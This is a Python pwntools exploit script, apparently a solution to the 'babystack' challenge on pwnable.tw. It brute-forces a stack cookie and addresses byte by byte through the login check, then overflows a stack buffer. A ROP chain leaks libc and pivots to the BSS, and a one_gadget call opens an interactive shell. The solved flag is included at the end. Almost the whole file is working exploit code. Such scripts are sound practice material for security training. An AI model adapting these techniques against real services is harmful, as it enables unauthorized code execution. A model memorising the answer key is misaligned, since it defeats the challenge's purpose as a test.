#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from binascii import hexlify, unhexlify
from time import sleep
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
def _rcvl():
  return io.recvline()
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('babystack')
env = {'LD_PRELOAD':'./libc_64.so.6'}
#env={}

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10205)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *(0x1051+0x0000555555554000)
#break *(0xFF1+0x0000555555554000)
#break *(0xE43+0x0000555555554000)
continue
'''.format(**locals())

# -- Exploit goes here --

FILL_CHAR = "#"
def login(password = "", line = "\n", fill = False):
    global logged_in

    if fill:
        _snda('>>', "1".ljust(16, FILL_CHAR))
    else:
        _snda('>>', 1)

    if logged_in:
        logged_in = False
        return

    _snda(':', password + line)

    data = _rcvu('!')
    if "Failed" in data:
        logged_in = False
    else:
        logged_in = True

def quit():
    _snda('>>', 2)

def copy(s):
    _snda('>>', 3)
    _snda(':', s)

def bruteforce(l = 8, initial = "", fill = False):
    log.info("Bruteforce started")
    leaked = initial

    for i in range(l):
        found = None

        for c in range(0x1, 0xff + 1):
            log.debug("Trying {} - {}".format(chr(c), leaked))
            if c == 0xa: continue
            login(leaked + chr(c), fill = fill)
            if logged_in:
                log.info("Found character {} ({})".format(chr(c), hex(c)))
                found = chr(c)
                login()
                break

        if found == None:
            log.error("Bruteforce failed.")
            log.info("Maybe the string contains illegal characters (0xa or 0x0).")
            raise Exception("BF failed")
        leaked += found

    return leaked[len(initial):]

io = None
logged_in = False
def exploit():
    global io, logged_in
    io = start()
    logged_in = False

    # cookie            - 16 bytes
    # menu input buffer - 16 bytes (or some 6-byte addr from stack here)
    # executable addr   - 6 bytes

    # leak the cookie
    leaked = bruteforce(16 + 6)
    cookie = leaked[:16]
    stack_addr   = leaked[16:]
    stack_addr   = unpack(stack_addr + "\x00\x00")
    log.success("Leaked cookie: {}".format(hexlify(cookie)))
    log.success("Leaked (some) stack addr: {}".format(hex(stack_addr)))

    # leak the addr
    leaked      = bruteforce(6, initial = cookie + "1".ljust(16, FILL_CHAR), fill = True)
    addr        = unpack(leaked + "\x00\x00") - 0x1060
    exe.address = addr
    log.success("Leaked binary base address: {}".format(hex(addr)))


    # 64 chars + cookie + 16 chars + rbp + rip
    read_input = exe.address + 0xCA0
    rip = pack(read_input)
    #log.info("Return to {}".format(hex(rip)))
    #rip = pack(rip)
    login("\x00" + "A"*63 + cookie + "".ljust(16 + 8, FILL_CHAR) + rip, "")

    if not logged_in:
        log.error("You must be logged in")
        raise Exception("BF failed")

    copy("B"*63)
    quit()

    # WARNING
    # NOASLR option causes a read error

    # read_input() function has some mov eax, [rax] instruction
    # which uses an address from the stack
    # if it is invalid, the program will be aborted
    # that's why we send some valid address in the beginning of the rop chain
    bss_free_area = exe.address + 0x202018

    # ROP chain to leak libc and for pivoting the stack to the BSS
    rop = ROP(exe)
    rop.puts(exe.got['puts'])
    rop.call(read_input, [bss_free_area, 100])
    rop.raw(exe.address + 0x10bd) # 0x00000000000010bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    rop.raw(bss_free_area)
    log.info(rop.dump())
    rop = pack(stack_addr) + "A"*24 + rop.chain()
    _snd(rop)

    # Leak libc
    libc = ELF(env['LD_PRELOAD'])
    addr = unpack(io.recvline().strip() + "\x00\x00") - libc.symbols['puts']
    libc.address = addr
    log.success("Libc base: {}".format(hex(addr)))
    io.clean()

    # ROP to get the shell
    rop = ROP(libc)
    for i in range(3): # junk for pop r13,r14,r15
        rop.raw(0xdeadbeef)
    # magic gadgets
    # 1 - rax == NULL
    # 2,3,4 - [rsp + off] == NULL
    one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
    rop.raw(libc.address + one_gadget[1])
    log.info(rop.dump())
    _snd(rop.chain())

    io.interactive()

exploit()
# FLAG{Its_juS7_a_st4ck0v3rfl0w}
